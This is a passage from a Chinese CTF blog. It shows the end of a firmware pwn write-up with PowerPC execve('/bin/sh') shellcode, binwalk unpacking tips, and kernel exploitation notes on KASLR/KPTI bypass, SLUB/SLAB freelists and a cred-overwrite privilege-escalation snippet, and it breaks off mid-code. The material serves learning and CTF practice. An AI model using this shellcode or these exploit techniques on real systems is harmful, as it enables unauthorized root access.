<p>参照如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201201955804.png" alt="image-20220120195537738"></p>
<p>远程肯定也是qemu，地址不会改变，那么就可以获得栈地址，同时依据调试数据也能得到我们输入数据的相应的偏移</p>

        <h3 id="3-寻找shellcode"   >
          <a href="#3-寻找shellcode" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-寻找shellcode" class="headerlink" title="(3)寻找shellcode"></a>(3)寻找shellcode</h3>
      <p>直接去<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://shell-storm.org/shellcode/" >shell-storm | Shellcodes Database</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>找对应的shellcode</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&quot;\x7c\x3f\x0b\x78&quot;	/*mr	r31,r1*/</span><br><span class="line">&quot;\x7c\xa5\x2a\x79&quot;	/*xor.	r5,r5,r5*/</span><br><span class="line">&quot;\x42\x40\xff\xf9&quot;	/*bdzl+	10000454&lt; main&gt;*/</span><br><span class="line">&quot;\x7f\x08\x02\xa6&quot;	/*mflr	r24*/</span><br><span class="line">&quot;\x3b\x18\x01\x34&quot;	/*addi	r24,r24,308*/</span><br><span class="line">&quot;\x98\xb8\xfe\xfb&quot;	/*stb	r5,-261(r24)*/</span><br><span class="line">&quot;\x38\x78\xfe\xf4&quot;	/*addi	r3,r24,-268*/</span><br><span class="line">&quot;\x90\x61\xff\xf8&quot;	/*stw	r3,-8(r1)*/</span><br><span class="line">&quot;\x38\x81\xff\xf8&quot;	/*addi	r4,r1,-8*/</span><br><span class="line">&quot;\x90\xa1\xff\xfc&quot;	/*stw	r5,-4(r1)*/</span><br><span class="line">&quot;\x3b\xc0\x01\x60&quot;	/*li	r30,352*/</span><br><span class="line">&quot;\x7f\xc0\x2e\x70&quot;	/*srawi	r0,r30,5*/</span><br><span class="line">&quot;\x44\xde\xad\xf2&quot;	/*.long	0x44deadf2*/</span><br><span class="line">&quot;/bin/shZ&quot;; // the last byte becomes NULL</span><br></pre></td></tr></table></div></figure>

<p>对应偏移找到即可</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201202003613.png" alt="image-20220120200332572"></p>
<p>覆盖LR寄存器为该地址完事</p>

        <h2 id="7-easymsg"   >
          <a href="#7-easymsg" class="heading-link"><i class="fas fa-link"></i></a><a href="#7-easymsg" class="headerlink" title="7.easymsg"></a>7.easymsg</h2>
      <p>没看懂</p>

        <h1 id="二、知识点"   >
          <a href="#二、知识点" class="heading-link"><i class="fas fa-link"></i></a><a href="#二、知识点" class="headerlink" title="二、知识点"></a>二、知识点</h1>
      
        <h2 id="1-固件解包-1"   >
          <a href="#1-固件解包-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-固件解包-1" class="headerlink" title="1.固件解包"></a>1.固件解包</h2>
      
        <h3 id="1-binwalk"   >
          <a href="#1-binwalk" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-binwalk" class="headerlink" title="(1)binwalk"></a>(1)binwalk</h3>
      <p>常用的命令</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">binwalk -Me xxx.bin  <span class="comment">#解包</span></span><br><span class="line">binwalk -A xxx.bin <span class="comment">#查看架构</span></span><br></pre></td></tr></table></div></figure>

<p>有时候可以用mount挂载binwalk打不开的固件</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount ./rootfs.img test</span><br></pre></td></tr></table></div></figure>


        <h2 id="2-固件加解密"   >
          <a href="#2-固件加解密" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-固件加解密" class="headerlink" title="2.固件加解密"></a>2.固件加解密</h2>
      
        <h3 id="1-判断加密"   >
          <a href="#1-判断加密" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-判断加密" class="headerlink" title="(1)判断加密"></a>(1)判断加密</h3>
      <p>有时候固件可能会被加密，可用binwalk的熵计算来判断，压缩或者加密的数据具有较高的熵值</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk -E xxx.bin</span><br></pre></td></tr></table></div></figure>

<p>未加密的</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201211850770.png" alt="image-20220121185003706"></p>
<p>加密的</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201211850841.png" alt="image-20220121185022780"></p>

        <h3 id="2-解密常见方法"   >
          <a href="#2-解密常见方法" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-解密常见方法" class="headerlink" title="(2)解密常见方法"></a>(2)解密常见方法</h3>
      <p>逆向，自己寻找等等</p>

        <h2 id="3-固件寻找"   >
          <a href="#3-固件寻找" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-固件寻找" class="headerlink" title="3.固件寻找"></a>3.固件寻找</h2>
      <p>网上，官网啥的，或者硬件提取，反正到时候再看一遍把，服务器，吾爱破解…</p>
<p>观察以下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201211856001.png" alt="image-20220121185648863"></p>
</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2022/01/14/kernel%E7%AC%94%E8%AE%B0%E6%B1%87%E6%80%BB/">kernel笔记汇总</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2022-01-14</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2022-03-16</span></span></div></header><div class="post-body"><div class="post-excerpt">
        <h1 id="一、查看保护"   >
          <a href="#一、查看保护" class="heading-link"><i class="fas fa-link"></i></a><a href="#一、查看保护" class="headerlink" title="一、查看保护"></a>一、查看保护</h1>
      
        <h2 id="1-KPTI"   >
          <a href="#1-KPTI" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-KPTI" class="headerlink" title="1.KPTI"></a>1.KPTI</h2>
      <p>内核页表隔离，开启之后可以访问用户空间内存，但是不能执行用户空间代码</p>
<p>即无法直接通过构造swapgs_iretq的ROP来返回用户态，可参考绕过</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/240006#h3-2" >Linux Kernel KPTI保护绕过 - 安全客，安全资讯平台 (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /sys/devices/system/cpu/vulnerabilities/*</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201162023861.png" alt="image.png"></p>
<p>这个也有类似的启动脚本</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-append &quot;console=ttyS0 quiet root=/dev/sda rw init=/init oops=panic panic=1 panic_on_warn=1 kaslr pti=on&quot; \</span><br></pre></td></tr></table></div></figure>


        <h2 id="2-SMEP、SMAP、KASLR等"   >
          <a href="#2-SMEP、SMAP、KASLR等" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-SMEP、SMAP、KASLR等" class="headerlink" title="2.SMEP、SMAP、KASLR等"></a>2.SMEP、SMAP、KASLR等</h2>
      <p>这个直接看启动脚本</p>

        <h3 id="1-SMEP和SMAP"   >
          <a href="#1-SMEP和SMAP" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-SMEP和SMAP" class="headerlink" title="(1)SMEP和SMAP"></a>(1)SMEP和SMAP</h3>
      <p>可以通过ROP修改CR3寄存器来绕过</p>

        <h3 id="2-KASLR"   >
          <a href="#2-KASLR" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-KASLR" class="headerlink" title="(2)KASLR"></a>(2)KASLR</h3>
      <p>要么爆破，要么泄露地址，由于kaslr的随机化程度只有9bit，大概16*2=32次，所以很好爆破</p>
<p>可以通过以下命令查看当前基地址</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/kallsyms | grep startup_64</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201181206238.png" alt="image-20220118120655137"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201181206574.png" alt="image-20220118120659509"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201181207963.png" alt="image-20220118120702901"></p>
<p>减去没有开启的KASLR的地址</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201181208263.png" alt="image-20220118120852208"></p>
<p>那么我们就可以假定这个offset来进行爆破了</p>

        <h2 id="3-其他保护"   >
          <a href="#3-其他保护" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-其他保护" class="headerlink" title="3.其他保护"></a>3.其他保护</h2>
      
        <h3 id="1-STACK-PROTECTOR"   >
          <a href="#1-STACK-PROTECTOR" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-STACK-PROTECTOR" class="headerlink" title="(1)STACK PROTECTOR"></a>(1)STACK PROTECTOR</h3>
      <p>类似用户态的cancary</p>

        <h3 id="2-参考README-MD"   >
          <a href="#2-参考README-MD" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-参考README-MD" class="headerlink" title="(2)参考README.MD"></a>(2)参考README.MD</h3>
      <p>有时候出题人给的README.MD会给配置</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">CONFIG_SLAB=y</span><br><span class="line">CONFIG_SLAB_FREELIST_RANDOM=y</span><br><span class="line">CONFIG_SLAB_FREELIST_HARDENED=y</span><br><span class="line">CONFIG_HARDENED_USERCOPY=y</span><br><span class="line">CONFIG_STATIC_USERMODEHELPER=y</span><br><span class="line">CONFIG_STATIC_USERMODEHELPER_PATH=&quot;&quot;</span><br></pre></td></tr></table></div></figure>

<p>如上就是使用SLAB分配，开启RANDOM和HARDENED保护，以及Hardened Usercopy（在向内核拷贝数据时会进行检查，检查<strong>地址是否存在、是否在堆栈中、是否为 slab 中 object、是否非内核 .text 段内地址等等</strong>）和 Static Usermodehelper Path（modprobe_path 为只读，不可修改）</p>
<p>参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://arttnba3.cn/2021/10/31/CTF-0X05-TCTF2021_FINAL/" >【CTF.0x05】TCTF2021-FINAL 两道 kernel pwn 题解 - arttnba3’s blog</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h1 id="二、泄露地址"   >
          <a href="#二、泄露地址" class="heading-link"><i class="fas fa-link"></i></a><a href="#二、泄露地址" class="headerlink" title="二、泄露地址"></a>二、泄露地址</h1>
      
        <h2 id="1-前置地址"   >
          <a href="#1-前置地址" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-前置地址" class="headerlink" title="1.前置地址"></a>1.前置地址</h2>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Dmesg</span><br><span class="line">cat /proc/kallsyms</span><br><span class="line">cat /sys/module/module_name/sections/.text</span><br></pre></td></tr></table></div></figure>


        <h2 id="2-获取基地址"   >
          <a href="#2-获取基地址" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-获取基地址" class="headerlink" title="2.获取基地址"></a>2.获取基地址</h2>
      <p>有UAF时通常可以打开/proc/self/stat来泄露地址，大小为0x20</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">struct seq_operations &#123;</span><br><span class="line">    void * (*start) (struct seq_file *m, loff_t *pos);</span><br><span class="line">    void (*stop) (struct seq_file *m, void *v);</span><br><span class="line">    void * (*next) (struct seq_file *m, void *v, loff_t *pos);</span><br><span class="line">    int (*show) (struct seq_file *m, void *v);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>






        <h1 id="三、下载generic版本内核"   >
          <a href="#三、下载generic版本内核" class="heading-link"><i class="fas fa-link"></i></a><a href="#三、下载generic版本内核" class="headerlink" title="三、下载generic版本内核"></a>三、下载generic版本内核</h1>
      
        <h1 id="四、打印地址"   >
          <a href="#四、打印地址" class="heading-link"><i class="fas fa-link"></i></a><a href="#四、打印地址" class="headerlink" title="四、打印地址"></a>四、打印地址</h1>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">printf(&quot;0x%lx\n&quot;,leakAddr);</span><br></pre></td></tr></table></div></figure>

<p>有时候不加<code>\n</code>打不出来</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#define HEX(x) printf(&quot;[*]0x%016lx\n&quot;, (size_t)x)</span><br><span class="line">#define LOG(addr) printf(&quot;[*]%s\n&quot;, addr)</span><br></pre></td></tr></table></div></figure>






        <h1 id="五、搜索内存"   >
          <a href="#五、搜索内存" class="heading-link"><i class="fas fa-link"></i></a><a href="#五、搜索内存" class="headerlink" title="五、搜索内存"></a>五、搜索内存</h1>
      <p>当不知道内存在哪里时，可以使用peda的搜索功能，搜索地址范围，常常在操控栈时很好用</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find &quot;galf&quot; 0xffffc900001d3f80 0xffffc900001d3f98</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201141705373.png" alt="image-20220114170510292"></p>

        <h1 id="六、常见漏洞及利用"   >
          <a href="#六、常见漏洞及利用" class="heading-link"><i class="fas fa-link"></i></a><a href="#六、常见漏洞及利用" class="headerlink" title="六、常见漏洞及利用"></a>六、常见漏洞及利用</h1>
      
        <h2 id="1-堆"   >
          <a href="#1-堆" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-堆" class="headerlink" title="1.堆"></a>1.堆</h2>
      
        <h3 id="前置知识"   >
          <a href="#前置知识" class="heading-link"><i class="fas fa-link"></i></a><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3>
      <p>通常而言为两种分配方式SLUB或者SLAB，SLUB默认会带上SLAB，但是可以进行设置，比如在编译内核的时候，使用<code>CONFIG_SLUB=n</code>， <code>CONFIG_SLAB=y</code>这样编译出来的内核就一定是SLAB分配的了。</p>

        <h4 id="kmalloc-caches"   >
          <a href="#kmalloc-caches" class="heading-link"><i class="fas fa-link"></i></a><a href="#kmalloc-caches" class="headerlink" title="kmalloc_caches"></a>kmalloc_caches</h4>
      <p>作为一个<code>kmem_cache</code>的结构体数组，管理着多个<code>kmem_cache</code>结构体指针。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203131247422.png" alt="image-20220313124755307"></p>
<p>但是不同版本下，由于分配方式的不同，导致也会<code>kmalloc_caches</code>的结构有点变化</p>
<p>比如在4.19.98的版本中，<code>kmalloc_caches</code>就只是一维数组</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203131617711.png" alt="image-20220313161710623"></p>
<p>而在5.6的版本下，<code>kmalloc_caches</code>变成了二维数组</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203131617882.png" alt="image-20220313161749775"></p>
<p>多出来的两个一维空间，就存放了<code>kmalloc-rcl</code>和<code>dma-kmalloc</code>，实际上也是相同的</p>

        <h4 id="SLUB下"   >
          <a href="#SLUB下" class="heading-link"><i class="fas fa-link"></i></a><a href="#SLUB下" class="headerlink" title="SLUB下"></a>SLUB下</h4>
      <p>通常我们分配的chunk的<code>freelist</code>为<code>kmalloc_caches[xx].cpu_slab + CPUX_addr</code>，也就是先得到对应CPU分配的基地址，然后加上<code>cpu_slab</code>即为对应<code>kmalloc-xx</code>的<code>freelist</code>的实际地址，如下图可以看到</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203162018978.png" alt="image-20220316201816364"></p>
<p>这里我在itExp中绑定了使用CPU3进行分配</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __USE_GNU</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">cpu_set_t</span> cpu_mask;</span><br><span class="line">CPU_ZERO(&amp;cpu_mask);<span class="comment">//初始化为0</span></span><br><span class="line">CPU_SET(<span class="number">3</span>,&amp;cpu_mask);<span class="comment">//绑定CPU3运行程序</span></span><br></pre></td></tr></table></div></figure>


        <h5 id="一维kmalloc-caches"   >
          <a href="#一维kmalloc-caches" class="heading-link"><i class="fas fa-link"></i></a><a href="#一维kmalloc-caches" class="headerlink" title="一维kmalloc_caches"></a>一维kmalloc_caches</h5>
      <p><code>kmalloc_caches[1]~kmalloc_caches[13]</code>为<code>kmalloc-8</code>~`kmalloc-8k`</p>
<p>而在只有一维空间的<code>kmalloc_caches</code>中，即不存在<code>kmalloc-rcl</code>和<code>dma-kmalloc</code>的版本下，比如4.19.98</p>
<p>如下图可以看到，也是很顺利地放入CPU3对应的<code>kmalloc-32</code>的<code>freelist</code>中</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203141222234.png" alt="image-20220314122243323"></p>
<p>但是CPU个数的不同，分配的基地址通常也会发生变化，这个具体还是看<code>__per_cpu_offset</code>这个全局变量中保存的内容吧，具体的细节不太知道</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203162010972.png" alt="image-20220316201020862"></p>
<p>如图为4个CPU的情况，这个还是不太一样的。</p>

        <h5 id="多维kmalloc-caches"   >
          <a href="#多维kmalloc-caches" class="heading-link"><i class="fas fa-link"></i></a><a href="#多维kmalloc-caches" class="headerlink" title="多维kmalloc_caches"></a>多维kmalloc_caches</h5>
      <p><code>kmalloc_caches[0][1]~kmalloc_caches[0][13]</code>为<code>kmalloc-8</code>~`kmalloc-8k`</p>
<p><code>kmalloc_caches[1][1]~kmalloc_caches[1][13]</code>为<code>kmalloc-rcl-8</code>~`kmalloc-rcl-8k`</p>
<p><code>kmalloc_caches[2][1]~kmalloc_caches[2][13]</code>为<code>dma-kmalloc-8</code>~`dma-kmalloc-8k`</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203131600906.png" alt="image-20220313160048795"></p>
<p>内存管理如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203131521126.png" alt="img"></p>
<p>在二维空间的<code>kmalloc_caches</code>下，依据CPU的不同，有不同的<code>freelist</code>，比如在有4个CPU的情况下，我们将程序绑定在CPU3上，如上面提到的一样</p>
<p>qemu启动效果之后，输入top，效果如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203141202734.png" alt="image-20220314120253236"></p>
<p>那么我们的<code>itExp</code>程序绑定的CPU3分配到的基地址即为<code>0xffff88800f380000</code>，结合<code>kmalloc_caches</code>中对应<code>kmalloc-xxx</code>下的<code>cpu_slab</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203141209330.png" alt="image-20220314120914190"></p>
<p>那么我们的<code>kmalloc-32</code>的<code>freelist</code>即为<code>0xffff88800f380000+0x2d260</code>，如下图可以看到，我们释放的chunk确实是放入了CPU3上对应的<code>kmalloc-32</code>的<code>freelist</code>中</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203162026812.png" alt="image-20220316202605604"></p>
<p>当然，在SLUB分配下，由于FD指针的存在，freelist更像是一个单向链表，freelist中的第一个chunk作为链表头依据FD指针串联起整个freelist</p>

        <h4 id="仅SLAB下"   >
          <a href="#仅SLAB下" class="heading-link"><i class="fas fa-link"></i></a><a href="#仅SLAB下" class="headerlink" title="仅SLAB下"></a>仅SLAB下</h4>
      <p>同样也具备多维或者一维的<code>kmalloc_caches</code></p>
<p><code>kmalloc_caches[0][1]~kmalloc_caches[0][2]</code>为<code>kmalloc-96~kmalloc-192</code></p>
<p><code>kmalloc_caches[0][3]~kmalloc_caches[0][4]</code>不知道为什么没有</p>
<p><code>kmalloc_caches[0][5]~kmalloc_caches[0][22]</code>为<code>kmalloc-32~kmalloc-4M</code></p>
<p>同理对应的多维和一维也是类似的</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203131601774.png" alt="image-20220313160119681"></p>
<p>分配方式上有点不同，具体的比较复杂，可以参考如下：</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/liuhangtiant/category_7929217.html" >(41条消息) slab内存管理方案学习记录_liuhangtiant的博客-CSDN博客</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>这种情况下的Chunk其实不带FD指针的，所以只用于<code>freelist</code>上即可，简单来说，slab的<code>freelist</code>更像是一个数组进行索引。</p>
<ul>
<li>首先找到索引，也就是<code>CPUX_addr + kmalloc_caches[xx][xx]cpu_cache</code>对应的值，以CPU3和kmalloc-1024为例：</li>
</ul>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203162039052.png" alt="image-20220316203909895"></p>
<ul>
<li>然后再找到freelist的地址，即<code>CPUX_addr + kmalloc_caches[xx][xx].cpu_cache.entry</code></li>
</ul>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203162040465.png" alt="image-20220316204056370"></p>
<p>其实通过观察我们可以知道，entry其实也就是<code>cpu_cache+0x10</code>而已。那么现在我们得到freelist的地址，就将其当作一个数组进行取用，比如这里的索引idx为2，那么我们下一次分配就会取freelist[2]这个obj，但是这里很奇怪，这个索引是从1开始的，如下：</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203162046044.png" alt="image-20220316204603914"></p>
<p>下一次分配取到chunk是<code>0xffff88800d538400</code>而非<code>0xffff88800d538c00</code>，我感觉这个索引idx更像是一个计数，表示还剩2个chunk可用，从尾部开始取用</p>

        <h5 id="🔺注："   >
          <a href="#🔺注：" class="heading-link"><i class="fas fa-link"></i></a><a href="#🔺注：" class="headerlink" title="🔺注："></a>🔺注：</h5>
      <p>当然以上的情况实际操作起来太麻烦，还不如写个小插件，自己进行计算</p>
<p>参考自己写的小工具：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/PIG-007/kernelAll" >PIG-007/kernelAll (github.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h6 id="SLAB："   >
          <a href="#SLAB：" class="heading-link"><i class="fas fa-link"></i></a><a href="#SLAB：" class="headerlink" title="SLAB："></a>SLAB：</h6>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203162049003.png" alt="image-20220316204859800"></p>

        <h6 id="SLUB："   >
          <a href="#SLUB：" class="heading-link"><i class="fas fa-link"></i></a><a href="#SLUB：" class="headerlink" title="SLUB："></a>SLUB：</h6>
      <p>这个带上了计算swab和random值得功能，也就是开启了harden的情况下，当然也还有FD偏移位置改变的情况，不过需要设置</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203162051067.png" alt="image-20220316205100876"></p>

        <h3 id="修改cred结构体"   >
          <a href="#修改cred结构体" class="heading-link"><i class="fas fa-link"></i></a><a href="#修改cred结构体" class="headerlink" title="修改cred结构体"></a>修改cred结构体</h3>
      <p>这个就不用说太多，通常是0xa8大小的结构体，清空前28bits</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> credBuf[<span class="number">0xa8</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">addFun(fd,<span class="number">0xa8</span>,credBuf);</span><br><span class="line">freeFun(fd,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">idFork = fork();</span><br><span class="line"><span class="keyword">if</span>(idFork == <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="comment">//get into 28*0 to set uid and gid 0</span></span><br><span class="line">    editFun(fd,<span class="number">0</span>,<span class="number">28</span>,credBuf);</span><br><span class="line">    <span class="keyword">if</span>(getuid() == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*]welcome root:\n&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(idFork &lt; <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*]fork fail\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    wait(<span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h3 id="修改FD申请"   >
          <a href="#修改FD申请" class="heading-link"><i class="fas fa-link"></i></a><a href="#修改FD申请" class="headerlink" title="修改FD申请"></a>修改FD申请</h3>
      
        <h4 id="1-HARDENED保护"   >
          <a href="#1-HARDENED保护" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-HARDENED保护" class="headerlink" title="(1)HARDENED保护"></a>(1)HARDENED保护</h4>
      <p>不过从4.14的内核版本开始，就存在<code>freelist_ptr</code>加密了，不过需要在编译内核的时候加入<code>CONFIG_SLAB_FREELIST_HARDENED</code>选项来启用，并且加密形式在不同版本不太一样。</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v4.14</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> *<span class="title">freelist_ptr</span><span class="params">(<span class="keyword">const</span> struct kmem_cache *s, <span class="keyword">void</span> *ptr,</span></span></span><br><span class="line"><span class="params"><span class="function">				 <span class="keyword">unsigned</span> <span class="keyword">long</span> ptr_addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SLAB_FREELIST_HARDENED</span></span><br><span class="line">	<span class="keyword">return</span> (<span class="keyword">void</span> *)((<span class="keyword">unsigned</span> <span class="keyword">long</span>)ptr ^ s-&gt;random ^ ptr_addr);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">	<span class="keyword">return</span> ptr;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//v5.16</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> *<span class="title">freelist_ptr</span><span class="params">(<span class="keyword">const</span> struct kmem_cache *s, <span class="keyword">void</span> *ptr,</span></span></span><br><span class="line"><span class="params"><span class="function">				 <span class="keyword">unsigned</span> <span class="keyword">long</span> ptr_addr)</span></span></span><br><span class="line"><span 